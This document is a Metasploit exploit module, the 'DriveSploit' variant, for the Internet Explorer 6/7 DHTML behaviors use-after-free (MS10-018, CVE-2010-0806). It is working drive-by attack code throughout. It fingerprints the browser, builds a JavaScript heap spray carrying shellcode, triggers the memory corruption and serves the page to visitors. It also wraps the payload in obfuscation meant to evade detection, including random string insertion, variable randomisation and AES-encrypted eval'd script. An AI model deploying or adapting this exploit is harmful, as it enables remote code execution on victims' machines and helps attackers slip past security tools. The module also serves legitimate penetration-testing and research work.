##
# $Id: ms10_018_ie_behaviors.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# originally ie_iepeers_pointer.rb
#
# Microsoft Internet Explorer iepeers.dll use-after-free exploit for the Metasploit Framework
#
# Tested successfully on the following platforms:
#  - Microsoft Internet Explorer 7, Windows Vista SP2
#  - Microsoft Internet Explorer 7, Windows XP SP3
#  - Microsoft Internet Explorer 6, Windows XP SP3
#
# Exploit found in-the-wild. For additional details:
# http://www.rec-sec.com/2010/03/10/internet-explorer-iepeers-use-after-free-exploit/
#
# Trancer
# http://www.rec-sec.com
##

#
# DriveSploit: this is drivesploit ported version
#

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer DHTML Behaviors Use After Free',
			'Description'    => %q{
					This module exploits a use-after-free vulnerability within the DHTML behaviors
				functionality of Microsoft Internet Explorer versions 6 and 7. This bug was
				discovered being used in-the-wild and was previously known as the "iepeers"
				vulnerability. The name comes from Microsoft's suggested workaround to block
				access to the iepeers.dll file.

				According to Nico Waisman, "The bug itself is when trying to persist an object
				using the setAttribute, which end up calling VariantChangeTypeEx with both the
				source and the destination being the same variant. So if you send as a variant
				an IDISPATCH the algorithm will try to do a VariantClear of the destination before
				using it. This will end up on a call to PlainRelease which deref the reference
				and clean the object."

				NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',                         # original discovery
					'Trancer <mtrancer[at]gmail.com>', # metasploit module
					'Nanika',                          # HIT2010 IE7 reliable PoC
					'jduck',                           # minor cleanups
                                        'wayne <wayne.armorize@gmail.com>' # armorize folks for drivesploit (drivesploit.org)
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2010-0806' ],
					[ 'OSVDB', '62810' ],
					[ 'BID', '38615' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/981374.mspx' ],
					[ 'URL', 'http://www.avertlabs.com/research/blog/index.php/2010/03/09/targeted-internet-explorer-0day-attack-announced-cve-2010-0806/' ],
					[ 'URL', 'http://eticanicomana.blogspot.com/2010/03/aleatory-persitent-threat.html' ],
					[ 'MSB', 'MS10-018' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ '(Automatic) IE6, IE7 on Windows NT, 2000, XP, 2003 and Vista',
						{
							'Method' => 'automatic'
						}
					],

					[ 'IE 6 SP0-SP2 (onclick)',
						{
							'Method' => 'onclick',
							'Ret' => 0x0C0C0C0C
						}
					],

					# "A great celebration of HIT2010" - http://www.hitcon.org/
					[ 'IE 7.0 (marquee)',
						{
							'Method' => 'marquee',
							'Ret' => 0x0C0C0C0C
						}
					],
				],
			'DisclosureDate' => 'Mar 09 2010',
			'DefaultTarget'  => 0))
	end


	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		print_status("Checking user agent: #{agent}")
		if agent =~ /Windows NT 6\.0/
			mytarget = targets[2]   # IE7 on Vista
			finger_id = "ie7"
		elsif agent =~ /MSIE 7\.0/
			mytarget = targets[2]   # IE7 on XP and 2003
			finger_id = "ie7"
		elsif agent =~ /MSIE 6\.0/
			mytarget = targets[1]   # IE6 on NT, 2000, XP and 2003
			finger_id = "ie6"
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

                print_status("Target selected: #{mytarget.name}")

		mytarget
		
	end


	def on_request_uri(cli, request)
		print_status("processing request")
		if target['Method'] == 'automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		else
			mytarget = target
		end

		print_status("regenerating payload")
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))

		# Set the return\nops
		ret_nops = Rex::Text.to_unescape([mytarget.ret].pack('V'))

		# drivesploit options
		ds_concat_all = datastore['ds_concat_all']
		ds_concat_shellcode = datastore['ds_concat_shellcode']
		ds_random_vars = datastore['ds_random_vars']
		ds_enable_fingerprint = datastore['ds_enable_fingerprint']
		ds_insertion_shellcode = datastore['ds_insertion_shellcode']

		doclocation = doclocation = "\"ab\"+\"out:\"+\"\\u0c0c\"+\"\\u0c0c\"+\"\\u0c0c\"+\"\\u0c0cbl\"+\"ank\""

		print_status("Drivespoit options: ds_concat_all: #{ds_concat_all}, ds_concat_shellcode: #{ds_concat_shellcode}, ds_insertion_shellcode: #{ds_insertion_shellcode}, ds_enable_fingerprint: #{ds_enable_fingerprint}")

		print_status("processing shellcode string insertion")
		if ds_insertion_shellcode
			print_status("random inserting strings into shellcode...")			
			begin
			insertret = Rex::Exploitation::DriveSploit.getInsertion(shellcode, 4, 6, 10)
			shellcode = insertret[0]
			random_insertion_string = insertret[1]

			print_status("insertion done for shellcode")

			print_status("random inserting strings into ret_nops...")
			insertret = Rex::Exploitation::DriveSploit.getInsertion(ret_nops, 3, 3, 4)
			ret_nops = insertret[0]
			random_insertion_string_retnops = insertret[1]
			rescue StandardError => err
                        print_status("Error 10: " + err)
                        end

			print_status("insertion done for ret nops")

		end

		print_status("processing shellcode concat")

		if ds_concat_shellcode
			begin
			print_status("concating shellcode");
			arr = Rex::Exploitation::DriveSploit.obfuscatejs(shellcode, Rex::Exploitation::DriveSploit::STRING_CONCAT)
			shellcode_script = arr[0]
			shellcode_var = arr[1]
			print_status("concating ret: #{ret_nops}");

			arr2 = Rex::Exploitation::DriveSploit.obfuscatejs(ret_nops, Rex::Exploitation::DriveSploit::STRING_CONCAT)
			ret_nops_script = arr2[0]
			ret_nops_var = arr2[1]
			rescue StandardError => err
	                        print_status("Error 20:" + err)
                        end
		else
			begin	
			print_status("not concating shellcode")
			shellcode_script = "var shellraw = \"#{shellcode}\";"
			shellcode_var = "shellraw";
			rescue StandardError => err
	                        print_status("Error 30:" + err)
                        end

			ret_nops_script = "var retcode = \"#{ret_nops}\";"
			ret_nops_var = "retcode";
		end
		
		print_status("handling insertion removal for shellcode script")		
		if ds_insertion_shellcode
			print_status("handling insertion removal for shellcode script--action taken")	
			begin	
			deletion_code_ret = Rex::Exploitation::DriveSploit.getRegEx(shellcode_var, random_insertion_string)
			shellcode_deletion_script = deletion_code_ret[0]
			shellcode_var = deletion_code_ret[1]

			shellcode_script = "#{shellcode_script} #{shellcode_deletion_script}" 

			print_status("handling insertion removal for ret nops")		
			deletion_code_ret = Rex::Exploitation::DriveSploit.getRegEx(ret_nops_var, random_insertion_string_retnops)
			retnops_deletion_script = deletion_code_ret[0]
			ret_nops_var = deletion_code_ret[1]

			ret_nops_script = "#{ret_nops_script} #{retnops_deletion_script}"
			rescue StandardError => err
	                        print_status("Error 40:" + err)
                        end
			print_status("insertion removal handled")
		end

		print_status("handling random variables stage 1")
		if ds_random_vars
			# here are variables used inside HTML and not just inside javascript, and therefore we must create random versions manually
			j_id = Rex::Exploitation::DriveSploit.randomString(rand(10) + 5)
			j_object = Rex::Exploitation::DriveSploit.randomString(rand(10) + 5)
			j_attrib = Rex::Exploitation::DriveSploit.randomString(rand(10) + 5)
		else
			j_id = "j_id"
			j_object = "j_object"
			j_attrib = "j_attrib"
		end

		print_status("constructing the general heapspray")
		# Construct the final page

js = %Q|

function spray(){
var counter;
var shellcode = unescape(#{shellcode_var});
var memory = new Array();
var slackspace = 0x86000-(shellcode.length*2);
var nops = unescape(#{ret_nops_var});
while(nops.length<slackspace/2) { nops+=nops; }
var fillblock = nops.substring(0,slackspace/2);
delete nops;
for(counter=0; counter<270; counter++) {
memory[counter] = fillblock + fillblock + shellcode;
}
}
function bootstrapper(){
spray();
|

		case mytarget['Method']

			when 'onclick'
				print_status("constructing IE6 specific code")

js += %Q|
var #{j_object} = document.createElement('body');
#{j_object}.addBehavior('#default#userData');
document.appendChild(#{j_object});
try {
for (counter=0; counter<10; counter++) {
#{j_object}.setAttribute('s',window);
}
} catch(e){ }
window.status+='';
}
document.getElementById('#{j_id}').onclick();
|

			when 'marquee'
				print_status("constructing IE7 specific code")

js += %Q|
for (counter = 1; counter <10; counter ++ ){
#{j_id}.setAttribute("#{j_attrib}",document.location);
}
#{j_id}.setAttribute("#{j_attrib}",document.getElementsByName("style"));
document.location=#{doclocation};
}
|
		end
		print_status("processing random variables stage 2")
		if ds_random_vars
			begin
			print_status("Randomizing variables")
			randomized = Rex::Exploitation::DriveSploit::obfuscatejs(js, Rex::Exploitation::DriveSploit::AUTO_RANDOM_VARS)
			print_status("return from randomizer")
			js = randomized[0]
			functionNames = randomized[1]
			#variableNames = randomized[2]
			print_status("getting function name")
			bootstrapper_var = functionNames['bootstrapper']
			rescue StandardError => err
	                        print_status("Error 50:" + err)
                        end

		else
			bootstrapper_var = "bootstrapper"
		end

		if ds_concat_all
			begin
			print_status("Concating entire javascript")
			arr = Rex::Exploitation::DriveSploit::obfuscatejs(js, Rex::Exploitation::DriveSploit::STRING_CONCAT)
			js = "#{arr[0]} eval(#{arr[1]});"
			rescue StandardError => err
	                        print_status("Error 60:" + err)
                        end

		end

		if ds_enable_fingerprint
			begin
			enc = Rex::Exploitation::DriveSploit::obfuscatejs(js, Rex::Exploitation::DriveSploit::FINGERPRINT_DECRYPT, finger_id)
			js = "var sequence =\"#{enc[2]}\"; var SupCry = \"#{enc[0].chop.gsub(/\n/,'\\\\n')}\"; #{enc[3]} #{enc[4]}  eval(GibberishAES.dec(SupCry, DecodeKey));"
			rescue StandardError => err
	                        print_status("Error 70:" + err)
                        end

	        end

		print_status("javascript processed, generating html")

		case mytarget['Method']

			when 'onclick'
html = %Q|<html><body>
<button id='#{j_id}' onclick='#{bootstrapper_var}();' style='display:none'></button>
<script>#{shellcode_script}  #{ret_nops_script} </script>
<script> #{js} </script></body></html>
|

			when 'marquee'
html = %Q|<html>
<head>
<style type="text/css">
.#{j_object} {behavior: url(#default#userData);}
</style>
</head>
<script language='javascript'>#{shellcode_script}  #{ret_nops_script} </script>
<script> #{js} </script>
<body onload="#{bootstrapper_var}();"></body>
<MARQUEE id="#{j_id}" class="#{j_object}"></MARQUEE>
</html>
|
		end

		print_status("html generated")

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)

	end

end

